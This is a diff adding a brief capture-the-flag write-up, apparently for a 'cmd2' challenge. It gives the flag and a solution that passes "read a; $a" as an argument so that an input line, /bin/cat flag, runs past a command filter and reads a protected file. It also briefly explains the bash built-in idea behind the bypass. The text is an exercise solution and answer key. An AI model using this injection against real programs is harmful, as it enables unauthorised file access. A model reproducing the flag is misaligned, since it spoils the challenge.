@@ -1,0 +1,10 @@
+Flag:
+	FuN_w1th_5h3ll_v4riabl3s_haha
+
+Solution command:
+```
+./cmd2 "read a; \$a"
+/bin/cat flag
+```
+
+Solved through research direction: looking for built-in bash commands which may be intersting (if we have no simple command execution - we might as well utilize the bash built-ins! Just like `echo`). Found read, and managed to utilize it.
